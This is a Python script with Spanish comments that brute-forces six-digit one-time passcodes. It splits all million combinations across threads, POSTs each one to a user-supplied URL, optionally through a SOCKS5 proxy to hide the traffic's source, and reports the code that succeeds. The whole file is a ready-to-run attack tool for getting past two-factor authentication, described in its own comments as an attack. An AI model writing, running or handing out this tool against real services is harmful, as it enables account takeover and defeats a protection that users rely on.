import requests
import itertools
import sys
from threading import Thread, Lock
import signal
from urllib.parse import urlparse

otp_length = 6  # Longitud de los códigos OTP
num_threads = 10  # Número de hilos predeterminado
stop = False
attempts = 0
proxies = None
url = None

# Bloqueo para sincronizar la salida en la consola
print_lock = Lock()

# Manejar la señal de interrupción para salir limpiamente
def signal_handler(sig, frame):
    global stop
    print("\nSaliendo...")
    stop = True
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Genera todas las combinaciones posibles de OTPs con 6 dígitos
def generate_all_combinations(length):
    return ("".join(map(str, comb)) for comb in itertools.product(range(10), repeat=length))

# Función que cada hilo ejecuta para probar las combinaciones OTP
def brute_force_worker(session, combinations):
    global stop, attempts, proxies, url
    for otp in combinations:
        if stop:
            break
        try:
            response = session.post(url, data={"otp": otp}, proxies=proxies)
            if response.status_code == 200:
                result = response.json()
                with print_lock:
                    attempts += 1
                    print(f"[+] Num Intentos Actuales: {attempts}", end='\r')
                if result.get("success"):
                    with print_lock:
                        print(f"\n[+] El OTP correcto es: {otp}")
                    stop = True
                    return
        except requests.RequestException as e:
            with print_lock:
                print(f"\n[!] Error al conectar con el servidor: {e}")
            stop = True
            sys.exit(1)

# Divide las combinaciones entre varios hilos
def brute_force_otp_multithreaded(num_threads):
    all_combinations = list(generate_all_combinations(otp_length))
    chunk_size = len(all_combinations) // num_threads

    threads = []
    session = requests.Session()
    for i in range(num_threads):
        start = i * chunk_size
        end = start + chunk_size if i < num_threads - 1 else len(all_combinations)
        thread_combinations = all_combinations[start:end]
        thread = Thread(target=brute_force_worker, args=(session, thread_combinations))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Verifica si una URL es válida
def validar_url(url):
    try:
        resultado = urlparse(url)
        return all([resultado.scheme, resultado.netloc])
    except ValueError:
        return False

# Función principal para manejar argumentos y ejecutar el ataque
def main():
    global proxies, url
    if len(sys.argv) < 3 or len(sys.argv) > 4:
        print(f"Uso: {sys.argv[0]} <num_hilos> <url> [proxy]")
        sys.exit(1)

    try:
        num_threads = int(sys.argv[1])
        if num_threads <= 0:
            raise ValueError
    except ValueError:
        print("Por favor, proporciona un número válido de hilos.")
        sys.exit(1)

    url = sys.argv[2]
    if not validar_url(url):
        print("[!] Error: Proporciona una URL válida que incluya el esquema (http/https)")
        sys.exit(1)

    if len(sys.argv) == 4:
        proxy = sys.argv[3]
        proxies = {
            "http": f"socks5h://{proxy}",
            "https": f"socks5h://{proxy}"
        }

    brute_force_otp_multithreaded(num_threads)

if __name__ == '__main__':
    main()

